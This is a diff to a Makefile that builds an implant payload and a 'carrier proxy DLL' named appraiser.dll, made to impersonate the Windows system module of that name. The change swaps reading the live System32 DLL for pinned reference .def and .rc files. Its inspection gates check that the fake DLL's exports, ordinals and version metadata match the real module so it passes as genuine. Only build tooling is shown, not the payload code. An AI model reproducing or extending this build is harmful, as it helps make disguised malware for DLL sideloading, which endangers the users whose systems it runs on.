@@ -12,6 +12,13 @@ MAP     := $(BUILD)/map
 INSP    := $(BUILD)/inspect
 GEN     := $(BUILD)/gen
 BIN     := bin
+REF     := reference
+
+# The pinned reference: export surface and version resource cloned once from
+# appraiser.dll (build 26100.9818). The build needs no live module; regenerate
+# with tools/gen_def.py / tools/gen_rc.py when deliberately moving the baseline.
+DEF     := $(REF)/appraiser.def
+RC      := $(REF)/appraiser.rc
 
 # Freestanding, size-optimised, no CRT, no unwind metadata, no cookie.
 CFLAGS  := -Os -Wall -Wextra -Werror -Iinclude -I$(GEN) \
@@ -24,13 +31,8 @@ LDFLAGS := -nostdlib -Wl,--entry,entry -Wl,--disable-dynamicbase \
 PAYLOAD := $(BIN)/payload.bin
 IMAGE   := $(BUILD)/payload.exe
 DLL     := $(BIN)/appraiser.dll
-DEF     := $(GEN)/appraiser.def
 PARAMS  := $(GEN)/hash_params.h
 PSTAMP  := $(GEN)/.params
-# Reference copy of the impersonated module; the gates diff against it.
-REAL_APPRAISER ?= $(firstword $(wildcard \
-	/mnt/c/Windows/System32/appraiser.dll \
-	C:/Windows/System32/appraiser.dll))
 
 .PHONY: all clean inspect test
 
@@ -45,12 +47,6 @@ $(PSTAMP): tools/genparams.py | $(GEN)
 	@touch $@
 
 $(PARAMS): $(PSTAMP)
-
-$(DEF): tools/gen_def.py $(REAL_APPRAISER) | $(GEN)
-	$(PY) tools/gen_def.py $(REAL_APPRAISER) appraiser > $@
-
-$(GEN)/appraiser.rc: tools/gen_rc.py $(REAL_APPRAISER) | $(GEN)
-	$(PY) tools/gen_rc.py $(REAL_APPRAISER) > $@
 
 # ---- COFF objects --------------------------------------------------
 $(OBJ)/entry_x64.o: asm/entry_x64.asm $(PSTAMP) | $(OBJ)
@@ -71,7 +67,7 @@ $(OBJ)/payload.o: src/payload.c include/implant.h include/resolve.h $(PARAMS) | 
 $(OBJ)/proxy.o: src/proxy.c include/proxy.h include/implant.h include/resolve.h $(PARAMS) | $(OBJ)
 	$(CC) $(CFLAGS) -c -o $@ src/proxy.c
 
-$(OBJ)/proxy_res.o: $(GEN)/appraiser.rc | $(OBJ)
+$(OBJ)/proxy_res.o: $(RC) | $(OBJ)
 	$(WINDRES) -i $< -o $@
 
 # ---- carrier proxy DLL ---------------------------------------------
@@ -127,27 +123,26 @@ inspect: $(PAYLOAD) $(IMAGE) $(DLL) | $(INSP)
 	    echo "FAIL: entry 0x$$(printf %x $$((ent+base))) != .text 0x$$(printf %x $$vma)"; \
 	    exit 1; \
 	fi
-	@echo "== gate: proxy EAT matches the module it impersonates =="
-	@$(OBJDUMP) -p $(REAL_APPRAISER) 2>/dev/null | \
-	    awk '/\+base\[/ && $$NF != "RVA" {t=$$0; sub(/.*\+base\[/,"",t); \
-	         sub(/\].*/,"",t); gsub(/ /,"",t); print t, $$NF}' | sort -k2 > $(INSP)/eat_real.txt
+	@echo "== gate: proxy EAT matches the pinned reference =="
+	@awk '/^    [A-Za-z_]/ {sub(/^ +/,""); split($$0,a," @"); print a[2], a[1]}' \
+	    $(DEF) | sort -k2 > $(INSP)/eat_ref.txt
 	@$(OBJDUMP) -p $(DLL) | \
 	    awk '/\+base\[/ && $$NF != "RVA" {t=$$0; sub(/.*\+base\[/,"",t); \
 	         sub(/\].*/,"",t); gsub(/ /,"",t); print t, $$NF}' | sort -k2 > $(INSP)/eat_proxy.txt
-	@diff $(INSP)/eat_real.txt $(INSP)/eat_proxy.txt >/dev/null && \
+	@diff $(INSP)/eat_ref.txt $(INSP)/eat_proxy.txt >/dev/null && \
 	    echo "  ok: $$(wc -l < $(INSP)/eat_proxy.txt) exports and ordinals identical" || \
 	    { echo "FAIL: export surface diverges"; \
-	      diff $(INSP)/eat_real.txt $(INSP)/eat_proxy.txt; exit 1; }
+	      diff $(INSP)/eat_ref.txt $(INSP)/eat_proxy.txt; exit 1; }
 	@echo "== gate: no forwarder entries in the proxy EAT =="
 	@$(OBJDUMP) -p $(DLL) | \
 	    sed -n '/\[Ordinal\/Name Pointer\] Table/,/^$$/p' | \
 	    grep -E '\.' && { echo "FAIL: forwarder entry present"; exit 1; } || \
 	    echo "  ok: every export is a real function"
-	@echo "== gate: proxy version metadata matches the impersonated module =="
-	@$(PY) tools/check_version.py "$(REAL_APPRAISER)" $(DLL) >/dev/null && \
+	@echo "== gate: proxy version metadata matches the pinned reference =="
+	@$(PY) tools/check_version.py $(RC) $(DLL) >/dev/null && \
 	    echo "  ok: OriginalFilename and version fields match" || \
 	    { echo "FAIL: version metadata diverges"; \
-	      $(PY) tools/check_version.py "$(REAL_APPRAISER)" $(DLL); exit 1; }
+	      $(PY) tools/check_version.py $(RC) $(DLL); exit 1; }
 	@echo "== gate: no data sections in the extracted range =="
 	@for s in .rdata .data .bss; do \
 	    sz=$$($(OBJDUMP) -h $(IMAGE) | awk -v s="$$s" '$$2==s {print "0x"$$3}'); \
